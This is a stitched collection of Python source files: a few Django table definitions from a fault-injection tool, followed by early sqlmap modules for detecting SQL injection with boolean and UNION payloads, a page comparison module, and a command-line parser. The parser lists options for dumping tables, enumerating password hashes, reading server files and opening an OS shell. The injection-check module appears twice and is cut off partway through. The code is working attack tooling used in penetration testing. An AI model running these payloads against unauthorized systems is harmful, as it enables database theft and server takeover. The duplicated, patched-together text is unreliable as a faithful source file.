    class Meta:
        attrs = {"class": "paleblue"}
        model = event
        fields = ('timestamp', 'level', 'source', 'event_type', 'description',                    
                  'success')                    


class injections_table(Table):
    class Meta:
        attrs = {"class": "paleblue"}
        model = injection
        order_by = ('target', 'target_index', 'register', 'bit', 'success')                    
        fields = ('target', 'target_index', 'register', 'bit',
                  'register_access', 'processor_mode', 'gold_value',
                  'injected_value', 'success')                    


class hw_injection_table(Table):
    timestamp = DateTimeColumn(format=datetime_format)

    class Meta:
        attrs = {"class": "paleblue"}
        model = injection
        exclude = ('config_object', 'config_type', 'checkpoint_number', 'field',
                   'id', 'register_index', 'result')


class simics_injection_table(Table):
    timestamp = DateTimeColumn(format=datetime_format)

    class Meta:
        attrs = {"class": "paleblue"}
        model = injection
        fields = ('injection_number', 'timestamp', 'checkpoint_number',
                  'target', 'target_index', 'register', 'register_index', 'bit',
                  'field', 'gold_value', 'injected_value', 'success')                    


class simics_register_diff_table(Table):
    class Meta:
        attrs = {"class": "paleblue"}
        model = simics_register_diff
        exclude = ('id', 'result')


class simics_memory_diff_table(Table):
    class Meta:
        attrs = {"class": "paleblue"}
        model = simics_memory_diff
        exclude = ('id', 'result')

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re
import time

from lib.controller.action import action
from lib.core.agent import agent
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapConnectionException
from lib.core.session import setString
from lib.core.session import setRegexp
from lib.request.connect import Connect as Request


def checkSqlInjection(place, parameter, value, parenthesis):
    """
    This function checks if the GET, POST, Cookie, User-Agent
    parameters are affected by a SQL injection vulnerability and
    identifies the type of SQL injection:

      * Unescaped numeric injection
      * Single quoted string injection
      * Double quoted string injection
    """

    randInt = randomInt()
    randStr = randomStr()

    if conf.prefix or conf.postfix:
        prefix  = ""
        postfix = ""

        if conf.prefix:
            prefix = conf.prefix

        if conf.postfix:
            postfix = conf.postfix

        infoMsg  = "testing custom injection "
        infoMsg += "on %s parameter '%s'" % (place, parameter)
        logger.info(infoMsg)

        payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt, postfix))
        trueResult = Request.queryPage(payload, place)

        if trueResult == True:
            payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1, postfix))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "confirming custom injection "
                infoMsg += "on %s parameter '%s'" % (place, parameter)
                logger.info(infoMsg)

                payload = agent.payload(place, parameter, value, "%s%s%s AND %s%s %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randStr, postfix))
                falseResult = Request.queryPage(payload, place)

                if falseResult != True:
                    infoMsg  = "%s parameter '%s' is " % (place, parameter)
                    infoMsg += "custom injectable "
                    logger.info(infoMsg)

                    return "custom"

    infoMsg  = "testing unescaped numeric injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming unescaped numeric injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "unescaped numeric injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "numeric"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "unescaped numeric injectable"
    logger.info(infoMsg)

    infoMsg  = "testing single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringsingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likesingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringdouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "double quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likedouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE double quoted string injectable"
    logger.info(infoMsg)

    return None


def checkDynParam(place, parameter, value):
    """
    This function checks if the url parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.
    """

    infoMsg = "testing if %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, str(randInt))
    dynResult1 = Request.queryPage(payload, place)

    if True == dynResult1:
        return False

    infoMsg = "confirming that %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "'%s" % randomStr())
    dynResult2 = Request.queryPage(payload, place)

    payload = agent.payload(place, parameter, value, "\"%s" % randomStr())
    dynResult3 = Request.queryPage(payload, place)

    condition  = True != dynResult2
    condition |= True != dynResult3

    return condition


def checkStability():
    """
    This function checks if the URL content is stable requesting the
    same page three times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """

    infoMsg = "testing if the url is stable, wait a few seconds"
    logger.info(infoMsg)

    firstPage, firstHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    secondPage, secondHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    thirdPage, thirdHeaders = Request.queryPage(content=True)                    

    condition  = firstPage == secondPage                    
    condition &= secondPage == thirdPage                    

    if condition == False:
        warnMsg  = "url is not stable, sqlmap will base the page "
        warnMsg += "comparison on a sequence matcher, if no dynamic nor "
        warnMsg += "injectable parameters are detected, refer to user's "
        warnMsg += "manual paragraph 'Page comparison' and provide a "
        warnMsg += "string or regular expression to match on"
        logger.warn(warnMsg)

    if condition == True:
        logMsg = "url is stable"
        logger.info(logMsg)

    return condition


def checkString():
    if not conf.string:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("String") and
                  kb.resumedQueries[conf.url]["String"][:-1] == conf.string
                )

    if condition:
        return True

    infoMsg  = "testing if the provided string is within the "
    infoMsg += "target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if conf.string in page:
        setString()
        return True
    else:
        errMsg  = "you provided '%s' as the string to " % conf.string
        errMsg += "match, but such a string is not within the target "
        errMsg += "URL page content, please provide another string."
        logger.error(errMsg)

        return False


def checkRegexp():
    if not conf.regexp:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("Regular expression") and
                  kb.resumedQueries[conf.url]["Regular expression"][:-1] == conf.regexp
                )

    if condition:
        return True

    infoMsg  = "testing if the provided regular expression matches within "
    infoMsg += "the target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if re.search(conf.regexp, page, re.I | re.M):
        setRegexp()
        return True
    else:
        errMsg  = "you provided '%s' as the regular expression to " % conf.regexp
        errMsg += "match, but such a regular expression does not have any "
        errMsg += "match within the target URL page content, please provide "
        errMsg += "another regular expression."
        logger.error(errMsg)

        return False


def checkConnection():
    infoMsg = "testing connection to the target url"
    logger.info(infoMsg)

    try:
        page, _ = Request.getPage()
        conf.seqMatcher.set_seq1(page)

    except sqlmapConnectionException, exceptionMsg:
        if conf.multipleTargets:
            exceptionMsg += ", skipping to next url"
            logger.warn(exceptionMsg)

            return False
        else:
            raise sqlmapConnectionException, exceptionMsg

    return True

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import sys

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser

from lib.core.data import logger
from lib.core.settings import VERSION_STRING


def cmdLineParser():
    """
    This function parses the command line parameters and arguments
    """

    usage = "%s [options]" % sys.argv[0]
    parser = OptionParser(usage=usage, version=VERSION_STRING)

    try:
        parser.add_option("-v", dest="verbose", type="int",
                          help="Verbosity level: 0-5 (default 1)")

        # Target options
        target = OptionGroup(parser, "Target", "At least one of these "
                             "options has to be specified to set the source "
                             "to get target urls from.")

        target.add_option("-u", "--url", dest="url", help="Target url")

        target.add_option("-l", dest="list", help="Parse targets from Burp "
                          "or WebScarab logs")

        target.add_option("-g", dest="googleDork",
                          help="Process Google dork results as target urls")

        target.add_option("-c", dest="configFile",
                          help="Load options from a configuration INI file")


        # Request options
        request = OptionGroup(parser, "Request", "These options can be used "
                              "to specify how to connect to the target url.")

        request.add_option("--method", dest="method", default="GET",
                           help="HTTP method, GET or POST (default: GET)")

        request.add_option("--data", dest="data",
                           help="Data string to be sent through POST")

        request.add_option("--cookie", dest="cookie",
                           help="HTTP Cookie header")

        request.add_option("--referer", dest="referer",
                           help="HTTP Referer header")

        request.add_option("--user-agent", dest="agent",
                           help="HTTP User-Agent header")

        request.add_option("-a", dest="userAgentsFile",
                           help="Load a random HTTP User-Agent "
                                "header from file")

        request.add_option("--headers", dest="headers",
                           help="Extra HTTP headers '\\n' separated")

        request.add_option("--auth-type", dest="aType",
                           help="HTTP Authentication type, value: "
                                "Basic or Digest")

        request.add_option("--auth-cred", dest="aCred",
                           help="HTTP Authentication credentials, value: "
                                "name:password")

        request.add_option("--proxy", dest="proxy",
                           help="Use a HTTP proxy to connect to the target url")

        request.add_option("--threads", dest="threads", type="int",
                           help="Maximum number of concurrent HTTP "
                                "requests (default 1)")

        request.add_option("--delay", dest="delay", type="float",
                           help="Delay in seconds between each HTTP request")

        request.add_option("--timeout", dest="timeout", type="float",
                           help="Seconds to wait before timeout connection "
                                "(default 30)")


        # Injection options
        injection = OptionGroup(parser, "Injection", "These options can be "
                                "used to specify which parameters to test "
                                "for, provide custom injection payloads and "
                                "how to parse and compare HTTP responses "
                                "page content when using the blind SQL "
                                "injection technique.")

        injection.add_option("-p", dest="testParameter",
                             help="Testable parameter(s)")

        injection.add_option("--dbms", dest="dbms",
                             help="Force back-end DBMS to this value")

        injection.add_option("--prefix", dest="prefix",
                             help="Injection payload prefix string")

        injection.add_option("--postfix", dest="postfix",
                             help="Injection payload postfix string")

        injection.add_option("--string", dest="string",
                             help="String to match in page when the "
                                  "query is valid")

        injection.add_option("--regexp", dest="regexp",
                             help="Regexp to match in page when the "
                                  "query is valid")

        injection.add_option("--excl-str", dest="eString",
                             help="String to be excluded before calculating "
                                  "page hash")

        injection.add_option("--excl-reg", dest="eRegexp",
                             help="Regexp matches to be excluded before "
                                  "calculating page hash")


        # Techniques options
        techniques = OptionGroup(parser, "Techniques", "These options can "
                                 "be used to test for specific SQL injection "
                                 "technique or to use one of them to exploit "
                                 "the affected parameter(s) rather than using "
                                 "the default blind SQL injection technique.")

        techniques.add_option("--stacked-test", dest="stackedTest",
                              action="store_true",
                              help="Test for stacked queries (multiple "
                                   "statements) support")

        techniques.add_option("--time-test", dest="timeTest",
                              action="store_true",
                              help="Test for Time based blind SQL injection")

        techniques.add_option("--union-test", dest="unionTest",
                              action="store_true",
                              help="Test for UNION query (inband) SQL injection")

        techniques.add_option("--union-use", dest="unionUse",
                              action="store_true",
                              help="Use the UNION query (inband) SQL injection "
                                   "to retrieve the queries output. No "
                                   "need to go blind")


        # Fingerprint options
        fingerprint = OptionGroup(parser, "Fingerprint")

        fingerprint.add_option("-f", "--fingerprint", dest="extensiveFp",
                               action="store_true",
                               help="Perform an extensive DBMS version fingerprint")


        # Enumeration options
        enumeration = OptionGroup(parser, "Enumeration", "These options can "
                                  "be used to enumerate the back-end database "
                                  "management system information, structure "
                                  "and data contained in the tables. Moreover "
                                  "you can run your own SQL SELECT queries.")

        enumeration.add_option("-b", "--banner", dest="getBanner",
                               action="store_true", help="Retrieve DBMS banner")

        enumeration.add_option("--current-user", dest="getCurrentUser",
                               action="store_true",
                               help="Retrieve DBMS current user")

        enumeration.add_option("--current-db", dest="getCurrentDb",
                               action="store_true",
                               help="Retrieve DBMS current database")

        enumeration.add_option("--is-dba", dest="isDba",
                               action="store_true",
                               help="Detect if the DBMS current user is DBA")

        enumeration.add_option("--users", dest="getUsers", action="store_true",
                               help="Enumerate DBMS users")

        enumeration.add_option("--passwords", dest="getPasswordHashes",
                               action="store_true",
                               help="Enumerate DBMS users password hashes (opt: -U)")

        enumeration.add_option("--privileges", dest="getPrivileges",
                               action="store_true",
                               help="Enumerate DBMS users privileges (opt: -U)")

        enumeration.add_option("--dbs", dest="getDbs", action="store_true",
                               help="Enumerate DBMS databases")

        enumeration.add_option("--tables", dest="getTables", action="store_true",
                               help="Enumerate DBMS database tables (opt: -D)")

        enumeration.add_option("--columns", dest="getColumns", action="store_true",
                               help="Enumerate DBMS database table columns "
                                    "(req:-T opt:-D)")

        enumeration.add_option("--dump", dest="dumpTable", action="store_true",
                               help="Dump DBMS database table entries "
                                    "(req: -T, opt: -D, -C, --start, --stop)")

        enumeration.add_option("--dump-all", dest="dumpAll", action="store_true",
                               help="Dump all DBMS databases tables entries")

        enumeration.add_option("-D", dest="db",
                               help="DBMS database to enumerate")

        enumeration.add_option("-T", dest="tbl",
                               help="DBMS database table to enumerate")

        enumeration.add_option("-C", dest="col",
                               help="DBMS database table column to enumerate")

        enumeration.add_option("-U", dest="user",
                               help="DBMS user to enumerate")

        enumeration.add_option("--exclude-sysdbs", dest="excludeSysDbs",
                               action="store_true",
                               help="Exclude DBMS system databases when "
                                    "enumerating tables")

        enumeration.add_option("--start", dest="limitStart", type="int",
                               help="First table entry to dump")

        enumeration.add_option("--stop", dest="limitStop", type="int",
                               help="Last table entry to dump")

        enumeration.add_option("--sql-query", dest="query",
                               help="SQL SELECT query to be executed")                    

        enumeration.add_option("--sql-shell", dest="sqlShell",
                               action="store_true",
                               help="Prompt for an interactive SQL shell")


        # File system options
        filesystem = OptionGroup(parser, "File system access", "These options "
                                 "can be used to access the back-end database "
                                 "management system file system taking "
                                 "advantage of native DBMS functions or "
                                 "specific DBMS design weaknesses.")

        filesystem.add_option("--read-file", dest="rFile",
                              help="Read a specific OS file content (only on MySQL)")

        filesystem.add_option("--write-file", dest="wFile",
                              help="Write to a specific OS file (not yet available)")


        # Takeover options
        takeover = OptionGroup(parser, "Operating system access", "This "
                               "option can be used to access the back-end "
                               "database management system operating "
                               "system taking advantage of specific DBMS "
                               "design weaknesses.")

        takeover.add_option("--os-shell", dest="osShell", action="store_true",
                            help="Prompt for an interactive OS shell "
                                 "(only on PHP/MySQL environment with a "
                                 "writable directory within the web "
                                 "server document root for the moment)")


        # Miscellaneous options
        miscellaneous = OptionGroup(parser, "Miscellaneous")

        miscellaneous.add_option("--eta", dest="eta", action="store_true",
                                 help="Retrieve each query output length and "
                                      "calculate the estimated time of arrival "
                                      "in real time")

        miscellaneous.add_option("--update", dest="updateAll", action="store_true",
                                help="Update sqlmap to the latest stable version")

        miscellaneous.add_option("-s", dest="sessionFile",
                                 help="Save and resume all data retrieved "
                                      "on a session file")

        miscellaneous.add_option("--save", dest="saveCmdline", action="store_true",
                                 help="Save options on a configuration INI file")

        miscellaneous.add_option("--batch", dest="batch", action="store_true",
                                 help="Never ask for user input, use the default behaviour")


        parser.add_option_group(target)
        parser.add_option_group(request)
        parser.add_option_group(injection)
        parser.add_option_group(techniques)
        parser.add_option_group(fingerprint)
        parser.add_option_group(enumeration)
        parser.add_option_group(filesystem)
        parser.add_option_group(takeover)
        parser.add_option_group(miscellaneous)

        (args, _) = parser.parse_args()

        if not args.url and not args.list and not args.googleDork and not args.configFile and not args.updateAll:
            errMsg  = "missing a mandatory parameter ('-u', '-l', '-g', '-c' or '--update'), "
            errMsg += "-h for help"
            parser.error(errMsg)

        return args
    except (OptionError, TypeError), e:
        parser.error(e)

    debugMsg = "parsing command line"
    logger.debug(debugMsg)

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.data import conf
from lib.core.settings import MATCH_RATIO


def comparison(page, headers=None, getSeqMatcher=False):
    regExpResults = None

    # String to be excluded before calculating page hash
    if conf.eString and conf.eString in page:
        index              = page.index(conf.eString)
        length             = len(conf.eString)
        pageWithoutString  = page[:index]
        pageWithoutString += page[index+length:]
        page               = pageWithoutString

    # Regular expression matches to be excluded before calculating page hash
    if conf.eRegexp:
        regExpResults = re.findall(conf.eRegexp, page, re.I | re.M)

        if regExpResults:
            for regExpResult in regExpResults:
                index              = page.index(regExpResult)
                length             = len(regExpResult)
                pageWithoutRegExp  = page[:index]
                pageWithoutRegExp += page[index+length:]
                page               = pageWithoutRegExp

    # String to match in page when the query is valid
    if conf.string:
        if conf.string in page:
            return True
        else:
            return False

    # Regular expression to match in page when the query is valid
    if conf.regexp:
        if re.search(conf.regexp, page, re.I | re.M):
            return True
        else:
            return False

    # By default it returns sequence matcher between the first untouched
    # HTTP response page content and this content
    conf.seqMatcher.set_seq2(page)

    if getSeqMatcher:
        return round(conf.seqMatcher.ratio(), 5)                    

    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:                    
        return True

    else:
        return False

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.agent import agent
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setUnion
from lib.request.connect import Connect as Request


def __effectiveUnionTest(query, comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    resultDict = {}

    for count in range(0, 50):
        if kb.dbms == "Oracle" and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:                    
            query += ", NULL"

        if kb.dbms == "Oracle":
            query += " FROM DUAL"

        commentedQuery = agent.postfixQuery(query, comment)
        payload = agent.payload(newValue=commentedQuery)
        newResult = Request.queryPage(payload)                    

        if not newResult in resultDict.keys():
            resultDict[newResult] = (1, commentedQuery)
        else:
            resultDict[newResult] = (resultDict[newResult][0] + 1, commentedQuery)

        if count:                    
            for element in resultDict.values():                    
                if element[0] == 1:                    
                    if kb.injPlace == "GET":
                        value = "%s?%s" % (conf.url, payload)                    
                    elif kb.injPlace == "POST":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nPOST:\t'%s'\n" % payload                    
                    elif kb.injPlace == "Cookie":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nCookie:\t'%s'\n" % payload                    
                    elif kb.injPlace == "User-Agent":
                        value  = "URL:\t\t'%s'" % conf.url
                        value += "\nUser-Agent:\t'%s'\n" % payload                    

                    return value

    return None


def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    logMsg  = "testing inband sql injection on parameter "
    logMsg += "'%s'" % kb.injParameter
    logger.info(logMsg)

    value = ""

    query = agent.prefixQuery(" UNION ALL SELECT NULL")

    for comment in (queries[kb.dbms].comment, ""):
        value = __effectiveUnionTest(query, comment)

        if value:
            setUnion(comment, value.count("NULL"))

            break

    if kb.unionCount:
        logMsg  = "the target url could be affected by an "
        logMsg += "inband sql injection vulnerability"
        logger.info(logMsg)
    else:
        warnMsg  = "the target url is not affected by an "
        warnMsg += "inband sql injection vulnerability"
        logger.warn(warnMsg)

    return value

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re
import time

from lib.controller.action import action
from lib.core.agent import agent
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapConnectionException
from lib.core.session import setString
from lib.core.session import setRegexp
from lib.request.connect import Connect as Request


def checkSqlInjection(place, parameter, value, parenthesis):
    """
    This function checks if the GET, POST, Cookie, User-Agent
    parameters are affected by a SQL injection vulnerability and
    identifies the type of SQL injection:

      * Unescaped numeric injection
      * Single quoted string injection
      * Double quoted string injection
    """

    randInt = randomInt()
    randStr = randomStr()

    if conf.prefix or conf.postfix:
        prefix  = ""
        postfix = ""

        if conf.prefix:
            prefix = conf.prefix

        if conf.postfix:
            postfix = conf.postfix

        infoMsg  = "testing custom injection "
        infoMsg += "on %s parameter '%s'" % (place, parameter)
        logger.info(infoMsg)

        payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt, postfix))
        trueResult = Request.queryPage(payload, place)

        if trueResult == True:
            payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1, postfix))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "confirming custom injection "
                infoMsg += "on %s parameter '%s'" % (place, parameter)
                logger.info(infoMsg)

                payload = agent.payload(place, parameter, value, "%s%s%s AND %s%s %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randStr, postfix))
                falseResult = Request.queryPage(payload, place)

                if falseResult != True:
                    infoMsg  = "%s parameter '%s' is " % (place, parameter)
                    infoMsg += "custom injectable "
                    logger.info(infoMsg)

                    return "custom"

    infoMsg  = "testing unescaped numeric injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming unescaped numeric injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "unescaped numeric injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "numeric"

